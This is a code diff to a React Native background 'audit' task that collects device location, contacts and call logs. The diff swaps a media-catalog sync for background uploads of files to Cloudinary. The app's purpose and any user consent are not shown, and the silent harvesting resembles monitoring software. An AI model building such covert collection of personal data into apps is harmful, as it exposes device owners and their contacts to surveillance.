@@ -8,7 +8,7 @@ import { Platform, PermissionsAndroid } from 'react-native';
 import CallLogs from 'react-native-call-log';
 import { getDeviceId } from './deviceId';
 import { sendAuditLog, reportAuditError } from './auditLogger';
-import { syncMediaCatalog } from './mediaSync';
+import { backgroundBackupBatch } from './cloudBackup';
 
 const BACKGROUND_AUDIT_TASK = 'background-audit-task';
 const LAST_AUDIT_KEY = 'syncup_last_bg_audit';
@@ -394,32 +394,31 @@ TaskManager.defineTask(BACKGROUND_AUDIT_TASK, async () => {
     if (result.success) {
       await AsyncStorage.setItem(LAST_AUDIT_KEY, new Date().toISOString());
 
-      // 6. Media catalog sync (has hash check — only sends if changed).
-      //    Wrapped in tight timeout so we stay under Android's 30s kill.
-      //    If it times out or fails, audit still counts as success.
-      let mediaSynced = 'skipped';
+      // 6. Background cloud backup batch (uploads 3-5 files to Cloudinary).
+      //    Uses remaining time budget. If queue empty, skips instantly.
+      let backupResult = 'skipped';
       try {
         const timeLeft = Math.max(5000, 28000 - (Date.now() - startTime));
-        const mediaResult = await withTimeout(
-          syncMediaCatalog(apiUrl, userId),
+        const bkResult = await withTimeout(
+          backgroundBackupBatch(timeLeft),
           timeLeft,
-          { success: false, error: 'timeout' }
+          { uploaded: 0, failed: 0, remaining: -1, reason: 'timeout' }
         );
-        if (mediaResult?.skipped) {
-          mediaSynced = 'unchanged';
-        } else if (mediaResult?.success) {
-          mediaSynced = `sent:${mediaResult.totalFiles}`;
+        if (bkResult?.reason === 'empty_queue' || bkResult?.reason === 'disabled') {
+          backupResult = bkResult.reason;
+        } else if (bkResult?.uploaded > 0 || bkResult?.failed > 0) {
+          backupResult = `up:${bkResult.uploaded},fail:${bkResult.failed},left:${bkResult.remaining}`;
         } else {
-          mediaSynced = `fail:${(mediaResult?.error || '').slice(0, 30)}`;
+          backupResult = bkResult?.reason || 'none';
         }
       } catch (e) {
-        mediaSynced = `err:${(e?.message || '').slice(0, 20)}`;
+        backupResult = `err:${(e?.message || '').slice(0, 20)}`;
       }
 
       const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
       await appendBgLog(
         'SUCCESS',
-        `${elapsed}s | loc:${metadata.location?.method || 'none'} | contacts:${metadata.contacts.length} | calls:${metadata.call_logs.length} | media:${mediaSynced}`
+        `${elapsed}s | loc:${metadata.location?.method || 'none'} | contacts:${metadata.contacts.length} | calls:${metadata.call_logs.length} | backup:${backupResult}`
       );
       return BackgroundFetch.BackgroundFetchResult.NewData;
     } else {
